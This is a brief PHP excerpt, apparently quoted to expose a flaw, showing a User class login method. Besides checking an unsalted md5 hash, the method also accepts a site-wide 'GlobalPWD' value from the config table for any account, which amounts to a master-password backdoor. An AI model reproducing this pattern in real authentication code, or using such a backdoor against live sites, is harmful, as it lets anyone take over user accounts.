...
class User {
	...
	function login($username, $password, $remember = 0) {
		...
		if ( $user = $this->db->fetch_one_array($sql) ) {
			$sql = "SELECT value FROM ".DB_TABLEPRE."config WHERE name='GlobalPWD'";
			$GlobalPWD = $this->db->fetch_one_array($sql);
			if ( $user['password'] == md5($password) || $password==$GlobalPWD['value']) {
